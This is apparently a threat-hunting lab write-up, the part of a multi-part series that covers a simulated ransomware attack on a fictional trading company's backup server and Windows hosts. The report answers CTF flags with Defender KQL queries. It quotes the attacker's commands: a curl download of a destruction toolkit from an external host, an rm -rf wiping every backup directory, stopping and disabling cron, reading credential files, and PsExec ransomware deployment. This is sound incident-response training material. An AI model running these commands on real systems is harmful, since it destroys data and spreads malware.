# THE AZUKI BREACH SAGA - Part 4: Dead in the Water

<img width="740" height="1100" alt="Screenshot 2026-01-22 at 3 50 54 PM" src="https://github.com/user-attachments/assets/1f711423-5b81-4bf5-80d0-1dfba95c12d4" />

## Executive Summary

This report documents the findings from Part 4 of the threat hunting investigation conducted on Azuki Import/Export Trading Co. This phase covers the final stage of the JADE SPIDER intrusion - the destruction of backup infrastructure and deployment of SilentLynx ransomware across the enterprise.

On November 25, 2025, the threat actors pivoted from the compromised CEO admin PC to the Linux backup server, systematically destroyed all backup data, disabled recovery mechanisms across Windows systems, and deployed the SilentLynx ransomware. The encryption was completed on November 27, 2025, at 05:48:14 UTC, with ransom notes demanding $850,000 USD in Monero.

The investigation revealed a sophisticated, multi-phase attack that eliminated all recovery options before encrypting 847,293 files across the enterprise.

---

## Scenario Overview

### Incident Brief

| Field | Detail |
|-------|--------|
| Company | Azuki Import/Export Trading Co. (梓貿易株式会社) |
| Situation | Ransom notes discovered across all systems. Threat actors destroyed backup infrastructure and deployed ransomware. |
| CEO Questions | How did they reach backups? What did they destroy? How did ransomware spread? Can we recover? |
| Evidence Available | Microsoft Defender for Endpoint logs (via Azure Log Analytics) |

### Investigation Scope

| Parameter | Value |
|-----------|-------|
| Time Period | November 25 - November 27, 2025 |
| Backup Server Pivot | November 25, 2025, 5:39 AM |
| Encryption Timestamp | November 27, 2025, 5:48:14 AM |
| Data Source | Microsoft Defender for Endpoint logs (Azure Log Analytics) |

### Systems in Scope

| Device | IP Address | Role | OS |
|--------|------------|------|-----|
| azuki-sl | 10.1.0.204 | Workstation (Beachhead) | Windows 11 |
| azuki-adminpc | 10.1.0.108 | Admin PC (CEO) | Windows 11 |
| azuki-fileserver01 | 10.1.0.188 | File Server | Server 2022 |
| azuki-backupsrv | 10.1.0.189 | Backup Server | Ubuntu 22.04 |

### Supporting Documents

- [Attack Timeline](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-4-dead-in-the-water/docs/chronological-timeline.md) - Chronological breakdown of attacker activity
- [Indicators of Compromise](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-4-dead-in-the-water/docs/indicators-of-compromise.md) - Complete IOC list with detection signatures

### Connection to Previous Parts

| Part | Date | Target | Key Activity |
|------|------|--------|--------------|
| Part 1 | November 19, 2025 | azuki-sl | Initial access, credential theft, persistence |
| Part 2 | November 22, 2025 | azuki-fileserver01 | File server compromise, data exfiltration |
| Part 3 | November 25, 2025 | azuki-adminpc | CEO PC compromise, extensive credential theft |
| Part 4 | November 25-27, 2025 | azuki-backupsrv + All systems | Backup destruction, ransomware deployment |

---

## Ransom Note Analysis - ([Ransom Note](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-4-dead-in-the-water/docs/ransom-note.md))

A ransom note was discovered on all encrypted systems from the "SilentLynx Security Team" - confirming the threat actor attribution to JADE SPIDER (SilentLynx is a known alias).

### Key Details from Ransom Note

| Field | Value |
|-------|-------|
| Threat Actor | SilentLynx Security Team |
| Affiliate ID | SL-AFF-2847 |
| Victim Key | AZUKI-BC844-1127 |
| Encryption Algorithm | AES-256-GCM |
| Key Exchange | X25519 ECDH |
| File Extension | .lynx |
| Files Encrypted | 847,293 |
| Data Encrypted | 847.2 GB |
| Data Exfiltrated | 126.6 GB |
| Ransom Demand | $850,000 USD in Monero |
| Payment Deadline | 72 hours |

### Vulnerabilities Exploited (per Ransom Note)

| ID | Severity | Finding |
|----|----------|---------|
| SL-V001 | CRITICAL | Weak email security - Phishing payload executed |
| SL-V002 | CRITICAL | Insufficient network segmentation |
| SL-V003 | CRITICAL | Credential reuse across systems |
| SL-V004 | CRITICAL | Inadequate backup isolation (no air-gap) |
| SL-V005 | CRITICAL | Missing EDR on Linux infrastructure |
| SL-V006 | HIGH | Local administrator password reuse |
| SL-V007 | HIGH | Lack of MFA on administrative accounts |

---

## Findings

### 🐧 PHASE 1: LINUX BACKUP SERVER COMPROMISE (FLAGS 1-12)

---

### Flag 1: Lateral Movement - Remote Access

**Objective:** Identify the remote access command executed from the compromised workstation to reach the backup server.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName in ("azuki-sl", "azuki-adminpc")
| where TimeGenerated >= datetime(2025-11-25)
| where ProcessCommandLine has_any ("ssh", "10.1.0.189")
| order by TimeGenerated asc
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
```

<img width="1200" alt="1" src="https://github.com/user-attachments/assets/49becad6-f7fc-4bc5-a2f8-c8fa4f915fe4" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 5:39:10 AM |
| Source Device | azuki-adminpc |
| Source Account | yuki.tanaka |
| Command | `"ssh.exe" backup-admin@10.1.0.189` |
| Target | azuki-backupsrv (10.1.0.189) |
| Target Account | backup-admin |

**Analysis:**

The attacker used Windows' built-in `ssh.exe` client to connect to the Linux backup server from the compromised CEO admin PC. This occurred on November 25, 2025, at 5:39 AM - during the same attack session as Part 3 (which ran from 4:06 AM - 6:10 AM).

Key observations:
- **Source:** azuki-adminpc (compromised in Part 3)
- **Target Account:** `backup-admin` - a privileged account for backup administration
- **Credential Source:** Likely obtained from the KeePass database (`Azuki-Passwords.kdbx`) exfiltrated in Part 3, or from the `all-credentials.txt` file discovered on the backup server

This demonstrates the attacker's systematic approach - after compromising the CEO's PC and stealing credentials, they immediately pivoted to the backup infrastructure to eliminate recovery options before deploying ransomware.

**MITRE ATT&CK Reference:**
- Remote Services: SSH (T1021.004)
- Lateral Movement (TA0008)

**Flag Answer:** `"ssh.exe" backup-admin@10.1.0.189`

---

### Flag 2: Lateral Movement - Attack Source

**Objective:** Identify the IP address that initiated the SSH connection to the backup server.

**Query Used:**
```kql
DeviceNetworkEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-25)
| where RemoteIP == "10.1.0.189"
| order by TimeGenerated asc
| project TimeGenerated, DeviceName, LocalIP, RemoteIP, RemotePort, InitiatingProcessCommandLine
```

<img width="1200" alt="2 3" src="https://github.com/user-attachments/assets/c54bb342-1953-4a97-9766-99d71f7060fa" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 5:39:11 AM |
| Source Device | azuki-adminpc |
| Source IP | 10.1.0.108 |
| Destination IP | 10.1.0.189 (azuki-backupsrv) |
| Destination Port | 22 (SSH) |
| Command | `"ssh.exe" backup-admin@10.1.0.189` |

**Analysis:**

The SSH connection to the backup server originated from IP address 10.1.0.108 (azuki-adminpc), which is the CEO's administrative PC compromised in Part 3. The connection was made on port 22 (standard SSH), confirming the use of SSH for lateral movement to the Linux backup server.

**Attack Path:**

| Part | Source | Target |
|------|--------|--------|
| Part 1 | External | azuki-sl (10.1.0.204) |
| Part 2 | azuki-sl (10.1.0.204) | azuki-fileserver01 (10.1.0.188) |
| Part 3 | azuki-sl (10.1.0.204) | azuki-adminpc (10.1.0.108) |
| Part 4 | azuki-adminpc (10.1.0.108) | azuki-backupsrv (10.1.0.189) |

The attacker systematically moved through the network, ultimately reaching the backup infrastructure from the CEO's PC - likely using credentials stolen from the KeePass database exfiltrated earlier in the same attack session.

**MITRE ATT&CK Reference:**
- Remote Services: SSH (T1021.004)

**Flag Answer:** `10.1.0.108`

---

### Flag 3: Credential Access - Compromised Account

**Objective:** Identify the account used to access the backup server.

**Reference:** This finding was derived from the same query results as Flags 1 and 2.

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 5:39:10 AM |
| Source Device | azuki-adminpc |
| SSH Command | `"ssh.exe" backup-admin@10.1.0.189` |
| Target Account | backup-admin |

**Analysis:**

The attacker used the `backup-admin` account to SSH into the Linux backup server. This is a privileged account specifically designed for backup administration, providing the attacker with the necessary permissions to access and manipulate backup infrastructure.

The `backup-admin` credentials were likely obtained from one of the credential stores exfiltrated during Part 3:
- KeePass database (`Azuki-Passwords.kdbx`) with its master password (`KeePass-Master-Password.txt`)
- Chrome saved passwords
- `OLD-Passwords.txt` plaintext file

This aligns with vulnerability SL-V003 from the ransom note: "Credential reuse across systems" - the backup admin credentials were stored alongside other credentials, enabling the attacker to pivot to critical infrastructure.

**Compromised Accounts Across All Parts:**

| Part | Account | Target System | Purpose |
|------|---------|---------------|---------|
| Part 1 | kenji.sato | azuki-sl | Initial access |
| Part 1 | support | azuki-sl | Backdoor account |
| Part 2 | fileadmin | azuki-fileserver01 | File server access |
| Part 3 | yuki.tanaka | azuki-adminpc | CEO PC access |
| Part 3 | yuki.tanaka2 | azuki-adminpc | Backdoor account |
| Part 4 | backup-admin | azuki-backupsrv | Backup server access |

**MITRE ATT&CK Reference:**
- Valid Accounts: Domain Accounts (T1078.002)

**Flag Answer:** `backup-admin`

---

### Flag 4: Discovery - Directory Enumeration

**Objective:** Identify the command used to list backup directory contents.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated >= todatetime('2025-11-25T05:39:11.0836084Z')
| where FileName == "ls"
| order by TimeGenerated asc
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
```

<img width="1200" alt="4" src="https://github.com/user-attachments/assets/1e8d04f4-d8f0-4832-a4e0-c0c0d3a643ac" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 5:47:51 AM |
| Device | azuki-backupsrv |
| Account | root |
| Command | `ls --color=auto -la /backups/` |

**Analysis:**

The attacker performed systematic directory enumeration to locate backup storage locations on the Linux server. The discovery phase shows a progression:

| Timestamp | Account | Command | Purpose |
|-----------|---------|---------|---------|
| 5:39:41 AM | backup-admin | `ls --color=auto -la` | Initial exploration of current directory |
| 5:41:43 AM | backup-admin | `ls --color=auto -la /var/backups/` | Checking system backup directory |
| 5:45:37 AM | root | `ls --color=auto` | Basic listing after privilege escalation |
| 5:47:51 AM | root | `ls --color=auto -la /var/backups/` | Re-checking system backups as root |
| 5:47:51 AM | root | `ls --color=auto -la /backups/` | **Discovered main backup storage** |

The attacker first explored the standard Linux system backup directory (`/var/backups/`) before discovering the custom corporate backup directory (`/backups/`). The final enumeration was performed as root after privilege escalation, indicating the attacker had already gained elevated access before locating the primary backup storage.

The command flags used:
- `--color=auto` - Default bash alias for colorized output
- `-l` - Long listing format (permissions, ownership, size)
- `-a` - Show hidden files

**MITRE ATT&CK Reference:**
- File and Directory Discovery (T1083)

**Flag Answer:** `ls --color=auto -la /backups/`

---

### Flag 5: Discovery - File Search

**Objective:** Identify the command used to search for backup archives.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where AccountName == "backup-admin"
| where TimeGenerated >= datetime(2025-11-24)
| where ProcessCommandLine startswith "find"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

<img width="1200" alt="5" src="https://github.com/user-attachments/assets/435e26da-dd8b-4066-b93d-f6ab7b4ef712" />

**Finding:**

| Timestamp | Account | Command | Purpose |
|-----------|---------|---------|---------|
| Nov 24, 2:16:06 PM | backup-admin | `find /backups -name *.tar.gz` | Search for backup archives |
| Nov 25, 5:42:39 AM | backup-admin | `find / -name *backup* -type d` | Search for all backup directories |

**Analysis:**

The attacker performed two file search operations across two days:

| Command | Purpose |
|---------|---------|
| `find /backups -name *.tar.gz` | Locate all compressed tar.gz backup archives in `/backups/` directory |
| `find / -name *backup* -type d` | System-wide search for any directory containing "backup" in the name |

The first command (Nov 24) specifically targeted known backup archives, while the second command (Nov 25) was a broader search to ensure no backup directories were missed anywhere on the system. This thorough approach demonstrates the attacker's intent to locate and destroy all possible recovery options.

| Argument | Purpose |
|----------|---------|
| `/backups` or `/` | Starting directory for search |
| `-name *.tar.gz` | Filter for tar.gz compressed archives |
| `-name *backup*` | Filter for anything containing "backup" |
| `-type d` | Only return directories |

**MITRE ATT&CK Reference:**
- File and Directory Discovery (T1083)

**Flag Answer:** `find /backups -name *.tar.gz`

---

### Flag 6: Discovery - Account Enumeration

**Objective:** Identify the command used to enumerate local accounts.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where TimeGenerated >= datetime(2025-11-24)
| where FileName contains "cat"
| where ProcessCommandLine has_any ("etc", "passwd")
| project TimeGenerated, DeviceName, InitiatingProcessAccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

<img width="1200" alt="6 7" src="https://github.com/user-attachments/assets/1a8bab0e-b1df-48ed-a518-1bb0876ee979" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 24, 2025, 2:16:08 PM |
| Device | azuki-backupsrv |
| Account | backup-admin |
| Command | `cat /etc/passwd` |

**Analysis:**

The attacker used `cat /etc/passwd` to enumerate all local user accounts on the Linux backup server. This file contains user account information including usernames, user IDs, group IDs, home directories, and default shells.

The query also revealed additional reconnaissance activity:

| Timestamp | Account | Command | Purpose |
|-----------|---------|---------|---------|
| Nov 24, 2:16:08 PM | backup-admin | `cat /etc/passwd` | Enumerate local accounts |
| Nov 24, 2:16:08 PM | backup-admin | `cat /etc/crontab` | Check scheduled tasks |
| Nov 25, 5:48:29 AM | root | `cat /etc/motd` | View message of the day |
| Nov 25, 5:52:46 AM | root | `cat /etc/motd` | View message of the day (repeated) |

The `/etc/passwd` enumeration happened just 2 seconds after the `find` command (Flag 5), showing rapid reconnaissance. The attacker also checked `/etc/crontab` to understand scheduled tasks - possibly looking for backup jobs or opportunities for persistence.

**MITRE ATT&CK Reference:**
- Account Discovery: Local Account (T1087.001)

**Flag Answer:** `cat /etc/passwd`

---

### Flag 7: Discovery - Scheduled Job Reconnaissance

**Objective:** Identify the command used to reveal scheduled jobs on the system.

**Reference:** This finding was derived from the same query results as Flag 6.

<img width="1200" alt="6 7" src="https://github.com/user-attachments/assets/884c6fd9-d9fa-49fa-be43-6cceda82c1cd" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 24, 2025, 2:16:08 PM |
| Device | azuki-backupsrv |
| Account | backup-admin |
| Command | `cat /etc/crontab` |

**Analysis:**

The attacker used `cat /etc/crontab` to view scheduled jobs on the Linux backup server. This command was executed just milliseconds after enumerating local accounts, demonstrating efficient reconnaissance.

The `/etc/crontab` file contains system-wide scheduled tasks, which on a backup server would typically include:
- Automated backup jobs
- Backup rotation schedules
- Cleanup and maintenance tasks
- Verification and integrity checks

By understanding the backup schedule, the attacker could:
- Time the attack to occur just after a backup completes (maximizing data loss)
- Identify backup scripts and their locations
- Understand the backup retention policy
- Plan destruction to avoid triggering alerts from failed backup jobs

**Discovery Timeline on azuki-backupsrv (Nov 24):**

| Timestamp | Command | Purpose |
|-----------|---------|---------|
| 2:16:06 PM | `find /backups -name *.tar.gz` | Locate backup archives |
| 2:16:08 PM | `cat /etc/passwd` | Enumerate local accounts |
| 2:16:08 PM | `cat /etc/crontab` | Reveal scheduled backup jobs |

All three discovery commands executed within 2 seconds - showing automated or scripted reconnaissance.

**MITRE ATT&CK Reference:**
- File and Directory Discovery (T1083)
- Scheduled Task/Job (T1053)

**Flag Answer:** `cat /etc/crontab`

---

### Flag 8: Command and Control - Tool Transfer

**Objective:** Identify the command used to download external tools to the backup server.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where TimeGenerated >= datetime(2025-11-24)
| where ProcessCommandLine has_any ("curl", "scp", "ftp", "sftp")
| project TimeGenerated, DeviceName, InitiatingProcessAccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

<img width="1200" alt="8" src="https://github.com/user-attachments/assets/153c7574-a834-4763-b317-1b78f277ae2a" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 5:45:34 AM |
| Device | azuki-backupsrv |
| Account | root |
| Command | `curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z` |

**Analysis:**

The attacker used `curl` to download a malicious archive named `destroy.7z` from the same anonymous file hosting service (litter.catbox.moe) used in Part 3. The filename "destroy" clearly indicates the intended purpose - backup destruction tools.

| Argument | Purpose |
|----------|---------|
| `-L` | Follow redirects |
| `-o destroy.7z` | Save output as destroy.7z |
| `https://litter.catbox.moe/io523y.7z` | External hosting URL |

**Infrastructure Reuse Across Parts:**

| Part | Device | File Downloaded | Source |
|------|--------|-----------------|--------|
| Part 3 | azuki-adminpc | KB5044273-x64.7z | litter.catbox.moe |
| Part 3 | azuki-adminpc | m-temp.7z | litter.catbox.moe |
| Part 4 | azuki-backupsrv | destroy.7z | litter.catbox.moe |

The attacker consistently uses litter.catbox.moe as their malware staging infrastructure. Note that this download was executed as **root**, indicating the attacker had already escalated privileges before downloading the destruction toolkit.

**MITRE ATT&CK Reference:**
- Ingress Tool Transfer (T1105)

**Flag Answer:** `curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z`

---

### Flag 9: Credential Access - Credential Theft

**Objective:** Identify the command used to access stored credentials on the backup server.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where InitiatingProcessAccountName in ("root", "backup-admin")
| where TimeGenerated >= datetime(2025-11-24)
| where ProcessCommandLine has_any ("cat", "password", "cred", "key", "secret")
| project TimeGenerated, DeviceName, InitiatingProcessAccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

<img width="1200" alt="9" src="https://github.com/user-attachments/assets/db61eb4c-6fc5-4d65-b43f-09b16dadb445" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 24, 2025, 2:14:14 PM |
| Device | azuki-backupsrv |
| Account | backup-admin |
| Command | `cat /backups/configs/all-credentials.txt` |

**Analysis:**

The attacker discovered and accessed a plaintext credentials file stored on the backup server. This file (`all-credentials.txt`) likely contains credentials for various systems backed up by this server - a catastrophic security failure.

The query also revealed additional configuration file access:

| Timestamp | Account | Command | Purpose |
|-----------|---------|---------|---------|
| Nov 24, 2:14:14 PM | backup-admin | `cat /backups/configs/all-credentials.txt` | Access stored credentials |
| Nov 24, 2:14:14 PM | backup-admin | `cat /backups/config-backups/network-config.txt` | Access network configuration |

**Critical Security Failures:**

1. **Plaintext credentials** - Storing credentials in a text file with no encryption
2. **Accessible location** - Credentials stored in the backup directory accessible by backup-admin
3. **Descriptive filename** - `all-credentials.txt` makes it easy for attackers to identify high-value targets

This finding aligns with vulnerability SL-V003 from the ransom note: "Credential reuse across systems" - the backup server stored credentials that could be used to access other systems in the network.

**Timeline Note:** This credential access occurred at 2:14:14 PM on Nov 24 - approximately 2 minutes **before** the file search and account enumeration commands we found in Flags 5 and 6 (2:16 PM). This suggests the attacker's first action was to grab credentials.

**MITRE ATT&CK Reference:**
- Unsecured Credentials: Credentials In Files (T1552.001)

**Flag Answer:** `cat /backups/configs/all-credentials.txt`

---

### Flag 10: Impact - Data Destruction

**Objective:** Identify the command used to destroy backup files.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where InitiatingProcessAccountName in ("root", "backup-admin")
| where TimeGenerated >= datetime(2025-11-25)
| where ProcessCommandLine has_any ("rm ", "shred", "wipe", "dd if", "truncate", "destroy")
| project TimeGenerated, DeviceName, InitiatingProcessAccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

<img width="1200" alt="10" src="https://github.com/user-attachments/assets/ba90949a-0bf6-424d-9db2-f727c3903cbe" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 5:47:02 AM |
| Device | azuki-backupsrv |
| Account | root |
| Command | `rm -rf /backups/archives /backups/azuki-adminpc /backups/azuki-fileserver /backups/azuki-logisticspc /backups/config-backups /backups/configs /backups/daily /backups/database-backups /backups/databases /backups/fileserver /backups/logs /backups/monthly /backups/weekly /backups/workstations` |

**Analysis:**

The attacker executed a devastating `rm -rf` command to recursively delete all backup directories in a single command. This occurred just 2 minutes after downloading the `destroy.7z` toolkit.

**Destruction Sequence:**

| Timestamp | Command | Target |
|-----------|---------|--------|
| 5:47:02.651 AM | `rm -rf /var/backups/...` | System backup files (dpkg, apt) |
| 5:47:02.660 AM | `rm -rf /backups/...` | **All corporate backup directories** |
| 5:47:02.682 AM | `rm -rf /backups/config-backups/*` | Configuration backups |
| 5:47:02.685 AM | `rm -rf /backups/database-backups/*` | Database backups |

**Backup Directories Destroyed:**

| Directory | Contents |
|-----------|----------|
| /backups/archives | Archived backups |
| /backups/azuki-adminpc | CEO PC backups |
| /backups/azuki-fileserver | File server backups |
| /backups/azuki-logisticspc | Logistics workstation backups |
| /backups/config-backups | Configuration file backups |
| /backups/configs | System configurations |
| /backups/daily | Daily backup rotation |
| /backups/database-backups | Database dumps |
| /backups/databases | Database files |
| /backups/fileserver | File server data |
| /backups/logs | Log archives |
| /backups/monthly | Monthly backup rotation |
| /backups/weekly | Weekly backup rotation |
| /backups/workstations | Workstation backups |

The `rm -rf` flags:
- `-r` - Recursive (delete directories and contents)
- `-f` - Force (no confirmation prompts, ignore non-existent files)

This aligns with vulnerability SL-V004 from the ransom note: "Inadequate backup isolation (no air-gap)" - the backups were accessible from the network, allowing complete destruction.

**MITRE ATT&CK Reference:**
- Data Destruction (T1485)
- Inhibit System Recovery (T1490)

**Flag Answer:** `rm -rf /backups/archives /backups/azuki-adminpc /backups/azuki-fileserver /backups/azuki-logisticspc /backups/config-backups /backups/configs /backups/daily /backups/database-backups /backups/databases /backups/fileserver /backups/logs /backups/monthly /backups/weekly /backups/workstations`

---

### Flag 11: Impact - Service Stopped

**Objective:** Identify the command used to stop the backup service.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where InitiatingProcessAccountName in ("root", "backup-admin")
| where TimeGenerated >= datetime(2025-11-25)
| where ProcessCommandLine has_any ("systemctl stop", "service stop", "killall", "kill -9", "init.d")
| project TimeGenerated, DeviceName, InitiatingProcessAccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

<img width="1200" alt="11" src="https://github.com/user-attachments/assets/34816593-93a3-4fee-adc8-c928be5c6e71" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 5:47:03 AM |
| Device | azuki-backupsrv |
| Account | root |
| Command | `systemctl stop cron` |

**Analysis:**

The attacker stopped the `cron` service using `systemctl stop cron`. The command was executed twice within milliseconds, likely for redundancy or as part of an automated script.

| Timestamp | Command |
|-----------|---------|
| 5:47:03.652 AM | `systemctl stop cron` |
| 5:47:03.659 AM | `systemctl stop cron` |

**Why Stop Cron?**

The `cron` daemon is responsible for running scheduled tasks on Linux systems. On a backup server, cron would typically handle:
- Automated backup jobs
- Backup verification tasks
- Log rotation
- Cleanup scripts
- Alert/monitoring scripts

By stopping cron, the attacker:
- Prevents any scheduled backup jobs from running
- Stops any monitoring/alerting scripts from triggering
- Ensures no automated recovery processes execute

**Attack Timeline on azuki-backupsrv (Nov 25):**

| Timestamp | Action |
|-----------|--------|
| 5:45:34 AM | Downloaded destroy.7z |
| 5:47:02 AM | Deleted all backup directories (`rm -rf`) |
| 5:47:03 AM | Stopped cron service |

The service stop occurred just 1 second after backup destruction - a tightly coordinated attack sequence.

**MITRE ATT&CK Reference:**
- Service Stop (T1489)

**Flag Answer:** `systemctl stop cron`

---

### Flag 12: Impact - Service Disabled

**Objective:** Identify the command used to permanently disable the backup service.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where InitiatingProcessAccountName in ("root", "backup-admin")
| where TimeGenerated >= datetime(2025-11-25)
| where ProcessCommandLine has_any ("systemctl disable", "update-rc.d", "chkconfig")
| project TimeGenerated, DeviceName, InitiatingProcessAccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

<img width="1200" alt="12" src="https://github.com/user-attachments/assets/1d2f45b0-2439-4557-a8c3-3c7cc33247ac" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 5:47:03 AM |
| Device | azuki-backupsrv |
| Account | root |
| Command | `systemctl disable cron` |

**Analysis:**

The attacker permanently disabled the `cron` service using `systemctl disable cron`. Like the stop command, this was executed twice within milliseconds, indicating an automated script.

| Timestamp | Command | Effect |
|-----------|---------|--------|
| 5:47:03.652 AM | `systemctl stop cron` | Immediately stops cron |
| 5:47:03.659 AM | `systemctl stop cron` | (Redundant) |
| 5:47:03.679 AM | `systemctl disable cron` | Prevents cron from starting at boot |
| 5:47:03.684 AM | `systemctl disable cron` | (Redundant) |

**Stop vs Disable:**

| Command | Effect | Survives Reboot? |
|---------|--------|------------------|
| `systemctl stop cron` | Stops the service immediately | No |
| `systemctl disable cron` | Prevents service from starting at boot | Yes |

By using both commands, the attacker ensured:
1. The cron service stops immediately (stop)
2. The cron service won't restart after a reboot (disable)

This is a thorough approach to ensure no scheduled backup or recovery jobs can run, even if an administrator reboots the server hoping to restore normal operations.

**Complete Backup Server Attack Sequence:**

| Timestamp | Action | MITRE ATT&CK |
|-----------|--------|--------------|
| 5:45:34 AM | Download destroy.7z | T1105 |
| 5:47:02 AM | Delete all backup directories | T1485 |
| 5:47:03 AM | Stop cron service | T1489 |
| 5:47:03 AM | Disable cron service | T1489 |

**MITRE ATT&CK Reference:**
- Service Stop (T1489)

**Flag Answer:** `systemctl disable cron`

---

### 💻 PHASE 2: WINDOWS RANSOMWARE DEPLOYMENT (FLAGS 13-15)

---

### Flag 13: Lateral Movement - Remote Execution

**Objective:** Identify the tool used to execute commands on remote systems.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated >= datetime(2025-11-25)
| where FileName in ("PsExec.exe", "PsExec64.exe", "wmic.exe", "sc.exe")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

<img width="1200" alt="13 14 15" src="https://github.com/user-attachments/assets/93d94cc3-e170-4830-baa0-198e80d9abe7" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 6:03:47 AM |
| Source Device | azuki-adminpc |
| Account | yuki.tanaka |
| Tool | PsExec64.exe |

**Analysis:**

The attacker used `PsExec64.exe` (Sysinternals remote execution tool) to deploy the `silentlynx.exe` implant across multiple systems. The deployment was launched from azuki-adminpc using credentials stolen throughout the intrusion.

**PsExec Deployment Sequence:**

| Timestamp | Target IP | Target System | Credential Used | Payload |
|-----------|-----------|---------------|-----------------|---------|
| 5:58:35 AM | - | Local | yuki.tanaka | `/accepteula` (first run) |
| 6:03:47 AM | 10.1.0.102 | Unknown workstation | kenji.sato | silentlynx.exe |
| 6:04:40 AM | 10.1.0.188 | azuki-fileserver01 | fileadmin | silentlynx.exe |
| 6:05:46 AM | 10.1.0.204 | azuki-sl | kenji.sato | silentlynx.exe |

> **Note:** 10.1.0.102 was later identified as azuki-logistics, a logistics workstation that received the silentlynx.exe payload but was outside the primary investigation scope.

**PsExec Command Breakdown:**

| Argument | Purpose |
|----------|---------|
| `\\10.1.0.xxx` | Target system IP address |
| `-u username` | Run as specified user |
| `-p **********` | Password (redacted in logs) |
| `-c` | Copy the executable to remote system |
| `-f` | Force copy even if file exists |
| `silentlynx.exe` | JADE SPIDER custom implant |

**Key Observations:**

1. **Credential Reuse** - The attacker used credentials stolen across multiple parts:
   - `kenji.sato` (compromised in Part 1)
   - `fileadmin` (compromised in Part 2)

2. **Implant Deployment** - `silentlynx.exe` (JADE SPIDER's custom implant) was deployed to all Windows systems

**MITRE ATT&CK Reference:**
- Remote Services: SMB/Windows Admin Shares (T1021.002)
- Lateral Tool Transfer (T1570)

**Flag Answer:** `PsExec64.exe`

---

### Flag 14: Lateral Movement - Deployment Command

**Objective:** Identify the full deployment command used to spread malware.

**Reference:** This finding was derived from the same query results as Flag 13.

<img width="1200" alt="13 14 15" src="https://github.com/user-attachments/assets/5ac0591b-62db-431a-9ce5-a1f2f41d5ca3" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 6:03:47 AM |
| Source Device | azuki-adminpc |
| Account | yuki.tanaka |
| Command | `"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe` |

**Analysis:**

The attacker used PsExec64.exe to remotely deploy the `silentlynx.exe` implant to target systems. The command reveals the full attack methodology:

| Argument | Value | Purpose |
|----------|-------|---------|
| `\\10.1.0.102` | Target IP | First target system |
| `-u kenji.sato` | Username | Compromised account from Part 1 |
| `-p **********` | Password | Stolen credentials (redacted) |
| `-c` | Copy flag | Copy executable to remote system |
| `-f` | Force flag | Overwrite if file already exists |
| `C:\Windows\Temp\cache\silentlynx.exe` | Payload | JADE SPIDER custom implant |

**Full Deployment Sequence:**

| Timestamp | Command |
|-----------|---------|
| 6:03:47 AM | `"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe` |
| 6:04:40 AM | `"PsExec64.exe" \\10.1.0.188 -u fileadmin -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe` |
| 6:05:46 AM | `"PsExec64.exe" \\10.1.0.204 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe` |

**Credential Reuse Evidence:**

| Account | Originally Compromised | Used Against |
|---------|------------------------|--------------|
| kenji.sato | Part 1 (azuki-sl) | 10.1.0.102, 10.1.0.204 (azuki-sl) |
| fileadmin | Part 2 (azuki-fileserver01) | 10.1.0.188 (azuki-fileserver01) |

This demonstrates the attacker leveraging stolen credentials from earlier phases to spread laterally across the entire network.

**MITRE ATT&CK Reference:**
- Remote Services: SMB/Windows Admin Shares (T1021.002)
- Lateral Tool Transfer (T1570)

**Flag Answer:** `"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe`

---

### Flag 15: Execution - Malicious Payload

**Objective:** Identify the payload deployed across the network.

